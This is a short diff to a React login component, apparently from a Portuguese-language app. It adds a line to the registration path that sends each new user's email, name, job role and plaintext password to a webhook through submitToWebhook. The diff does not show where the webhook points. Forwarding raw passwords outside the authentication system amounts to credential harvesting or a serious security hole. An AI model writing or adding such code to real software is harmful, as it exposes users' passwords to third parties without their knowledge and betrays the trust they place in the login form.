@@ -80,6 +80,7 @@ const Login = () => {
                 setSuccessMsg("Instruções de recuperação enviadas para o seu e-mail.");
             } else if (isRegistering) {
                 await auth.register(email, password, fullName);
+                await submitToWebhook("Cadastro", { "Email": email, "Nome": fullName, "Senha": password, "Funcao": jobRole });
                 setFullName('');
                 setEmail('');
                 setPassword('');
